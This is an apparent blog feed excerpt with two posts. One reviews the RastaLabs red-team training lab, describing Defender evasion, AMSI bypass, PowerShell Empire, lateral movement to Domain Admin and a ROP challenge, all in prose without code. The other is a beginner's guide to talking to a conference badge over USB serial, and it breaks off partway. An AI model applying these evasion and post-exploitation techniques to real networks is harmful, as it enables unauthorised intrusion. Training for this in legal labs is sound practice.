   <content type="html">&lt;div dir=&quot;ltr&quot; style=&quot;&quot; trbidi=&quot;on&quot;&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Introduction&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;It was 20 November, and I was just starting to wonder what I would do during the next month. I had already left my previous job, and the new one would only start in January. Playing with PS4 all month might sound fun for some people, but I knew I would get bored quickly.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Even though I have some limited red teaming experience, I always felt that I wanted to explore the excitement of getting Domain Admin – again. I got my first DA in ˜2010 using pass-the-hash, but that was a loooong time ago, and things change quickly.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;While reading the backlogs of one of the many Slack rooms, I noticed that certain chat rooms were praising RastaLabs. Looking at the lab description, I felt &quot;this is it, this is exactly what I need.&quot; How hard could it be, I have a whole month ahead of me, surely I will finish it before Christmas. Boy, was I wrong.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/giphy.gif&quot; src=&quot;https://z6543.github.io/_img/giphy.gif&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;365&quot; data-original-width=&quot;500&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/giphy.gif&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;The one-time fee of starting the lab is 90 GBP which includes the first month, then every additional month costs 20 GBP. I felt like I was stealing money from Rastamouse and Hackthebox... How can it be so cheap? Sometimes cheap indicates low quality, but not in this case.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/tenor2B252812529.gif&quot; src=&quot;https://z6543.github.io/_img/tenor2B252812529.gif&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;368&quot; data-original-width=&quot;498&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/tenor2B252812529.gif&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;My experience&lt;/h2&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Regarding my previous experience, I already took OSCP, OSCE, SLAE (Securitytube Linux Assembly Expert), and PSP (Powershell for Pentesters), all of which helped me a lot during the lab. I also had some limited red teaming experience. I had more-than-average experience with AV evasion, and I already had experience with the new post-exploit frameworks like Covenant and Powershell Empire. As for writing exploits, I knew how a buffer overflow or a format string attack worked, but I lacked practice in bypassing ASLR and NX. I basically had zero experience with Mimikatz on Windows 10. I used Mimikatz back in 2012, but probably not since. I also had a lot of knowledge on how to do X and Y, on useful tools and hot techniques, but I lacked recent experience with them. Finally, I am usually the last when it comes to speed in hacking, but I have always balanced my lack of speed with perseverance.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;RastaLabs starts in 3,2,1 ...&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;So I paid the initial entry fee, got the VPN connection pack, connected to the lab, and got my first flag after ... 4 days. And there were 17 of them in total. This was the first time I started to worry. I did everything to keep myself on the wrong track, stupid things like assuming incorrect lab network addresses, scanning too few machines, finding the incorrect breadcrumbs via OSINT, trying to exploit a patched web service (as most OSCPers would do), etc. I was also continually struggling with the tools I was using, as I never knew whether they were buggy, or I was misusing them, or this is just not the way to get the flag. I am sure someone with luck and experience could have done this stage in 2-3 hours, but hey, I was there to gain experience.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;During the lab, whenever I got stuck with the same problem for more than 30-40 hours and my frustration was running high, I pinged Rastamouse on the official RastaLabs support channel on &lt;a href=&quot;https://mm.netsecfocus.com/&quot;&gt;https://mm.netsecfocus.com/&lt;/a&gt;. I usually approached him like &quot;Hi, I tried X, Y, and Z but no luck&quot;, then he replied &quot;yeah, try Y harder&quot;. This kind of information was usually all I needed, and 2-3 hours later I was back on track again. His help was always enough, but never too much to spoil the fun. The availability and professionalism of Rastamouse was 10/10. Huge multi-billion dollar companies fail to provide good enough support, this one guy here was always there to help. Amazing. I highly recommend joining the Mattermost channel – it will help you a lot to see that you are not the only one stuck with problems. But please do not DM him or the channel if you have not already tried harder.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;What's really lovely in the lab is that you can expect real-world scenarios with &quot;RastaLabs employees&quot; working on their computer, reading emails, browsing the web, etc. I believe it is not a spoiler here that at some point in time you have to deliver malware that evades the MS Defender AV on the machine. Yes, there is a real working Defender on the machines, and although it is a bit out of date, it might catch your default payload very quickly. As I previously mentioned, luckily I had recent experience with AV evasion, so this part was not new to me. I highly recommend setting up your own Win10 with the latest Defender updates and testing your payload on it first. If it works there, it will work in the lab. This part can be especially frustrating, because the only feedback you get from the lab is that nothing is happening, and there is no way to debug it. Test your solution locally first.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Powershell Empire turned out to be an excellent solution for me, the only functionality it lacked was Port Forwarding. But you can drop other tools to do this job efficiently.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;A little help: even if you manage to deliver your payload and you have a working C&amp;amp;C, it does not mean your task with AV evasion is over. It is highly probable that Defender will block your post-exploit codes. To bypass this, read all the blog posts from Rastamouse about AMSI bypass. This is important.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Lateral movement&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;When you finally get your first shell back ...&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Popped2Ba2BShell2B-2BImgur.gif&quot; src=&quot;https://z6543.github.io/_img/Popped2Ba2BShell2B-2BImgur.gif&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;198&quot; data-original-width=&quot;250&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Popped2Ba2BShell2B-2BImgur.gif&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;A whole new world starts. From now on, you will spend significant time on password cracking, lateral movement, persistence, and figuring out how Windows AD works.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;In the past, I played a lot of CTF, and from time to time I got the feeling &quot;yeah, even though this challenge was fun, it was not realistic&quot;. This never happened during RastaLabs. All the challenges and solutions were 100% realistic, and as the &quot;Ars poetica&quot; of RastaLabs states:&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-162Bat2B17.21.38.png&quot; imageanchor=&quot;1&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-162Bat2B17.21.38.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;724&quot; data-original-width=&quot;1330&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-162Bat2B17.21.38.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;...which is sooooo true. None of the tasks involve any exploit of any CVE. You need a different mindset for this lab. You need to think about misconfigurations, crackable passwords, privilege abuse, and similar issues. But I believe this lab is still harder to own than 90% of the organizations out there. The only help is that there are no blue-teamers killing our shells.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;About the architecture of the lab: When connecting to the lab with VPN, you basically found yourself in a network you might label as &quot;Internet&quot;, with your target network being behind a firewall, just as a proper corporate network should be.&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-122Bat2B16.16.21.png&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-122Bat2B16.16.21.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;777&quot; data-original-width=&quot;1600&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-122Bat2B16.16.21.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;There are a bunch of workstations – Win10 only, and some servers like fileserver, exchange, DC, SQL server, etc. The majority of servers are Windows Server 2016, and there is one Linux server. The two sites are adequately separated and firewalled.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;As time passed, I was getting more and more flags, and I started to feel the power. Then the rollercoaster experience started. I was useless, I knew nothing. Getting the flag, I was god. One hour later, I was useless.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/tenor.gif&quot; src=&quot;https://z6543.github.io/_img/tenor.gif&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;178&quot; data-original-width=&quot;250&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/tenor.gif&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;For example, I spent a significant amount of time trying to get GUI access to the workstations. In the end, I managed to get that, just to find out I did not achieve anything with it. For unknown reasons, none of the frameworks I tried had a working VNC, so I set up my own, and it was pain.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;On December 18, I finally got Domain Admin privileges. So my estimation to &quot;finish the lab&quot; in one month was not that far off. Except that I was far from finishing it, as I still had to find five other flags I was missing. You might ask &quot;you already have DA, how hard could it be to find the remaining five?&quot;. Spoiler alert, it was hard. Or to be more precise, not hard, just challenging, and time-consuming. This was also a time when connections on Mattermost RastaLabs channel helped me a lot. Hints like &quot;flag X is on machine Y&quot; helped me keep motivated, yet it did not spoil the fun. Without hints like this, I would not have written this post but would have been stuck with multiple flags.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;About exploitation&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;And there was the infamous challenge, &quot;ROP the night away.&quot; This was totally different from the other 16. I believe this image explains it all:&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/cc18b3bbe0ceeba8a2992e4826a5300db5170652.jpg&quot; src=&quot;https://z6543.github.io/_img/cc18b3bbe0ceeba8a2992e4826a5300db5170652.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;192&quot; data-original-width=&quot;341&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/cc18b3bbe0ceeba8a2992e4826a5300db5170652.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;If you are not friends with GDB, well, you will have a hard time. If you don't have lots of hands-on experience with NX bypass - a.k.a ROP - like me, you will have a hard time with this challenge. The binary exploit challenges during OSCP and OSCE exams are nowhere near as complex as this one. If you have OSEE, you will be fine. For this challenge, I used GDB-Peda and Python pwntools – check them out in case you are not familiar with them. For me, solving this challenge took about 40 hours. Experienced CTF people could probably solve it in 4 hours or less.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Conclusion&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;I would not recommend taking this lab for total beginners *. I also do not recommend doing the lab if you only have limited time per day, which is especially true if you are working on your home computer. I probably would have saved hours or even days if I had set up a dedicated server in the cloud for this lab. The issue was that the lab workstations were rebooted every day, which meant that I always lost my shells. &quot;Persistence FTW&quot;, you might say, but if your C&amp;amp;C is down when the workstation reboots, you are screwed. &quot;Scheduled tasks FTW&quot;, you might say, but unless you have a strict schedule on when you start your computer, you will end up with a bunch of scheduled tasks just to get back the shell whenever you start your computer. Day after day I spent the first hour getting back to where I had been the day before. And I just figured out at the end of the lab why some of my scheduled tasks were not working ...&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;I would be really interested to see how much time I spent connected to the lab. Probably it was around 200–250 hours in total, which I believe is more than I spent on OSCP and OSCE combined. But it was totally worth it. I really feel the power now that I learned so many useful things.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;But if you consider that the price of the one-month lab is 20 GBP, it is still a very cheap option to practice your skills. &lt;/div&gt;&lt;div style=&quot;&quot;&gt;* It is totally OK to do the lab in 6 months, in case you start as a beginner. That is still just 190 GBP for the months of lab access, and you will gain a lot of experience during this time. You will probably have a hard time reaching the point when you have a working shell, but it is OK. You can find every information on Google, you just need time, patience and willingness to get there.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Anyway, it is still an option not to aim to &quot;get all the flags&quot;. Even just by getting the first two flags, you will gain significant experience in &quot;getting a foothold&quot;. But for me, not getting all the flags was never an option.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/cover8.jpg&quot; src=&quot;https://z6543.github.io/_img/cover8.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;900&quot; data-original-width=&quot;1600&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/cover8.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;If you are still unconvinced, check these other blog posts:&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;https://jmpesp.me/a-rastalabs-story/&quot;&gt;https://jmpesp.me/a-rastalabs-story/&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;a href=&quot;https://www.gerrenmurphy.com/rastalabs-review/&quot;&gt;https://www.gerrenmurphy.com/rastalabs-review/&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;Or see what others wrote about RastaLabs.&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-122Bat2B17.21.11.png&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-122Bat2B17.21.11.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;911&quot; data-original-width=&quot;1600&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2020-01-122Bat2B17.21.11.png&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2 style=&quot;text-align: justify;&quot;&gt;Footnote&lt;/h2&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;In case you start the lab, please, pretty please, follow the rules, and do not spoil the fun for others. Do not leave your tools around, do not keep shared drives open, do not leave FLAGs around. Leave the machine as it was. If you have to upload a file, put it in a folder others won't easily find. This is a necessary mindset when it comes to real-world red teaming. Don't forget to drop a party parrot into the chat whenever you or someone else gets a new flag. And don't forget:&lt;/div&gt;&lt;blockquote class=&quot;tr_bq&quot; style=&quot;text-align: justify;&quot;&gt;OSCP has no power here. Cry harder!&lt;/blockquote&gt;&lt;div style=&quot;&quot;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;I will probably keep my subscription to the lab and try new things, new post-exploit frameworks. I would like to thank @_rastamouse for this great experience, @superkojiman for the ROP challenge. Hackthebox for hosting the lab with excellent uptime.&lt;/div&gt;&lt;div style=&quot;&quot;&gt;As for @gentilkiwi and @harmj0y, these two guys probably advanced red-teaming more than everyone else combined together. pwntools from @gallopsled was also really helpful. And I will be forever grateful to Bradley from finance for his continuous support whenever I lost my shells.&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Hacktivity 2018 badge - quick start guide for beginners</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/badge/hacking/hacktivity/hw/2019/09/19/Hacktivity-2018-badge-quick-start-guide-for-beginners.html"/>
   <updated>2019-09-19T15:57:50+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/badge/hacking/hacktivity/hw/2019/09/19/Hacktivity-2018-badge---quick-start-guide-for-beginners</id>
   <content type="html">&lt;div&gt;You either landed on this blog post because &lt;/div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;you are a huge fan of Hacktivity&lt;/li&gt;&lt;li&gt;you bought this badge around a year ago&lt;/li&gt;&lt;li&gt;you are just interested in hacker conference badge hacking. &lt;/li&gt;&lt;/ul&gt;
&lt;div&gt;or maybe all of the above. Whatever the reasons, this guide should be helpful for those who never had any real-life experience with these little gadgets. &lt;/div&gt;
&lt;div&gt;But first things first, here is a list what you need for hacking the badge:&lt;/div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;a computer with USB port and macOS, Linux or Windows. You can use other OS as well, but this guide covers these&lt;/li&gt;&lt;li&gt;USB mini cable to connect the badge to the computer&lt;/li&gt;&lt;li&gt;the Hacktivity badge from 2018&lt;/li&gt;&lt;/ul&gt;
&lt;div&gt;By default, this is how your badge looks like.&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://z6543.github.io/_img/IMG_8640.JPG&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Let's get started&lt;/h2&gt;
&lt;p&gt;Luckily, you don’t need any soldering skills for the first steps. Just connect the USB mini port to the bottom left connector on the badge, connect the other part of the USB cable to your computer, and within some seconds you will be able to see that the lights on your badge are blinking. So far so good. Now, depending on which OS you use, you should choose your destiny here.&lt;/p&gt;
&lt;h3&gt;Linux&lt;/h3&gt;
&lt;p&gt;The best source of information about a new device being connected is&lt;/p&gt;
&lt;h1 id=&quot;dmesg&quot;&gt;dmesg&lt;/h1&gt;
&lt;p&gt;The tail of the output should look like&lt;/p&gt;
&lt;pre&gt;[267300.206966] usb 2-2.2: new full-speed USB device number 14 using uhci_hcd
[267300.326484] usb 2-2.2: New USB device found, idVendor=0403, idProduct=6001
[267300.326486] usb 2-2.2: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[267300.326487] usb 2-2.2: Product: FT232R USB UART
[267300.326488] usb 2-2.2: Manufacturer: FTDI
[267300.326489] usb 2-2.2: SerialNumber: &lt;b&gt;AC01U4XN&lt;/b&gt;
[267300.558684] usbcore: registered new interface driver usbserial_generic
[267300.558692] usbserial: USB Serial support registered for generic
[267300.639673] usbcore: registered new interface driver ftdi_sio
[267300.639684] usbserial: USB Serial support registered for FTDI USB Serial Device
[267300.639713] ftdi_sio 2-2.2:1.0: FTDI USB Serial Device converter detected
[267300.639741] usb 2-2.2: Detected FT232RL
[267300.643235] usb 2-2.2: FTDI USB Serial Device converter now attached to &lt;b&gt;ttyUSB0&lt;/b&gt;&lt;/pre&gt;
&lt;div style=&quot;&quot;&gt;&lt;br /&gt;Dmesg is pretty kind to us, as it even notifies us that the device is now attached to ttyUSB0. 
From now on, connecting to the device is exactly the same as it is in the macOS section, so please find the &quot;Linux users, read it from here&quot; section below. &lt;/div&gt;
&lt;h3&gt;macOS&lt;/h3&gt;
&lt;div&gt;There are multiple commands you can type into Terminal to get an idea about what you are looking at. One command is:&lt;/div&gt;
&lt;div&gt; &lt;/div&gt;
&lt;div&gt;&lt;pre&gt;# ioreg -p IOUSB -w0 -l&lt;/pre&gt;&lt;/div&gt;
&lt;div&gt;&lt;br /&gt;&lt;/div&gt;
&lt;div&gt;With this command, you should get output similar to this:&lt;/div&gt;
&lt;div&gt; &lt;br /&gt;&lt;pre&gt;+-o FT232R USB UART@14100000  &amp;lt;class AppleUSBDevice, id 0x100005465, registered, matched, active, busy 0 (712 ms), retain 20&amp;gt;&lt;br /&gt;    |   {&lt;br /&gt;    |     &quot;sessionID&quot; = 71217335583342&lt;br /&gt;    |     &quot;iManufacturer&quot; = 1&lt;br /&gt;    |     &quot;bNumConfigurations&quot; = 1&lt;br /&gt;    |     &quot;idProduct&quot; = 24577&lt;br /&gt;    |     &quot;bcdDevice&quot; = 1536&lt;br /&gt;    |     &quot;Bus Power Available&quot; = 250&lt;br /&gt;    |     &quot;USB Address&quot; = 2&lt;br /&gt;    |     &quot;bMaxPacketSize0&quot; = 8&lt;br /&gt;    |     &quot;iProduct&quot; = 2&lt;br /&gt;    |     &quot;iSerialNumber&quot; = 3&lt;br /&gt;    |     &quot;bDeviceClass&quot; = 0&lt;br /&gt;    |     &quot;Built-In&quot; = No&lt;br /&gt;    |     &quot;locationID&quot; = 336592896&lt;br /&gt;    |     &quot;bDeviceSubClass&quot; = 0&lt;br /&gt;    |     &quot;bcdUSB&quot; = 512&lt;br /&gt;    |     &quot;USB Product Name&quot; = &quot;FT232R USB UART&quot;&lt;br /&gt;    |     &quot;PortNum&quot; = 1&lt;br /&gt;    |     &quot;non-removable&quot; = &quot;no&quot;&lt;br /&gt;    |     &quot;IOCFPlugInTypes&quot; = {&quot;9dc7b780-9ec0-11d4-a54f-000a27052861&quot;=&quot;IOUSBFamily.kext/Contents/PlugIns/IOUSBLib.bundle&quot;}&lt;br /&gt;    |     &quot;bDeviceProtocol&quot; = 0&lt;br /&gt;    |     &quot;IOUserClientClass&quot; = &quot;IOUSBDeviceUserClientV2&quot;&lt;br /&gt;    |     &quot;IOPowerManagement&quot; = {&quot;DevicePowerState&quot;=0,&quot;CurrentPowerState&quot;=3,&quot;CapabilityFlags&quot;=65536,&quot;MaxPowerState&quot;=4,&quot;DriverPowerState&quot;=3}&lt;br /&gt;    |     &quot;kUSBCurrentConfiguration&quot; = 1&lt;br /&gt;    |     &quot;Device Speed&quot; = 1&lt;br /&gt;    |     &quot;USB Vendor Name&quot; = &quot;FTDI&quot;&lt;br /&gt;    |     &quot;idVendor&quot; = 1027&lt;br /&gt;    |     &quot;IOGeneralInterest&quot; = &quot;IOCommand is not serializable&quot;&lt;br /&gt;    |     &quot;USB Serial Number&quot; = &quot;&lt;b&gt;AC01U4XN&lt;/b&gt;&quot;&lt;br /&gt;    |     &quot;IOClassNameOverride&quot; = &quot;IOUSBDevice&quot;&lt;br /&gt;    |   } &lt;br /&gt;&lt;/pre&gt;The most important information you get is the USB serial number - AC01U4XN in my case.&lt;br /&gt;Another way to get this information is&lt;br /&gt;&lt;pre&gt;# system_profiler SPUSBDataType&lt;br /&gt;&lt;br /&gt;&lt;/pre&gt;which will give back something similar to:&lt;br /&gt;&lt;pre&gt;FT232R USB UART:&lt;br /&gt;&lt;br /&gt;          Product ID: 0x6001&lt;br /&gt;          Vendor ID: 0x0403  (Future Technology Devices International Limited)&lt;br /&gt;          Version: 6.00&lt;br /&gt;          Serial Number: &lt;b&gt;AC01U4XN&lt;/b&gt;&lt;br /&gt;          Speed: Up to 12 Mb/sec&lt;br /&gt;          Manufacturer: FTDI&lt;br /&gt;          Location ID: 0x14100000 / 2&lt;br /&gt;          Current Available (mA): 500&lt;br /&gt;          Current Required (mA): 90&lt;br /&gt;          Extra Operating Current (mA): 0&lt;br /&gt;&lt;/pre&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The serial number you got is the same.&lt;br /&gt;&lt;br /&gt;What you are trying to achieve here is to connect to the device, but in order to connect to it, you have to know where the device in the /dev folder is mapped to. A quick and dirty solution is to list all devices under /dev when the device is disconnected, once when it is connected, and diff the outputs. For example, the following should do the job:&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;ls -lha /dev/tty* &amp;gt; plugged.txt&lt;br /&gt;ls -lha /dev/tty* &amp;gt; np.txt&lt;br /&gt;vimdiff plugged.txt np.txt&lt;br /&gt;&lt;/pre&gt;&lt;br /&gt;The result should be obvious, /dev/tty.usbserial-AC01U4XN is the new device in case macOS. In the case of Linux, it was /dev/ttyUSB0.&lt;br /&gt;&lt;h4&gt;Linux users, read it from here. macOS users, please continue reading&lt;/h4&gt;Now you can use either the built-in screen command or minicom to get data out from the badge. Usually, you need three information in order to communicate with a badge. Path on /dev (you already got that), speed in baud, and the async config parameters. Either you can guess the speed or you can Google that for the specific device. Standard baud rates include 110, 300, 600, 1200, 2400, 4800, 9600, 14400, 19200, 38400, 57600, 115200, 128000 and 256000 bits per second. I usually found 1200, 9600 and 115200 a common choice, but that is just me.&lt;br /&gt;Regarding the async config parameters, the default is that &lt;b&gt;8&lt;/b&gt; bits are used, there is &lt;b&gt;n&lt;/b&gt;o parity bit, and &lt;b&gt;1&lt;/b&gt; stop bit is used. The short abbreviation for this is 8n1. In the next example, you will use the screen command. By default, it uses 8n1, but it is called cs8 to confuse the beginners.&lt;br /&gt;&lt;br /&gt;If you type:&lt;br /&gt;# screen /dev/tty.usbserial-AC01U4XN 9600&lt;br /&gt;or&lt;br /&gt;# screen /dev/ttyUSB0 9600&lt;br /&gt;and wait for minutes and nothing happens, it is because the badge already tried to communicate via the USB port, but no-one was listening there. Disconnect the badge from the computer, connect again, and type the screen command above to connect. If you are quick enough you can see that the amber LED will stop blinking and your screen command is greeted with some interesting information. By quick enough I mean ˜90 seconds, as it takes the device 1.5 minutes to boot the OS and the CTF app.&lt;br /&gt;&lt;h3&gt;Windows&lt;/h3&gt;&lt;div&gt;When you connect the device to Windows, you will be greeted with a pop-up.&lt;/div&gt;&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B17.52.32.png&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B17.52.32.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;124&quot; data-original-width=&quot;488&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B17.52.32.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Just click on the popup and you will see the COM port number the device is connected to:&lt;/div&gt;&lt;br /&gt;&lt;div&gt;&lt;a href=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B17.52.55.png&quot; src=&quot;https://z6543.github.io/_img/Screen2BShot2B2019-09-162Bat2B17.52.55.png&quot; 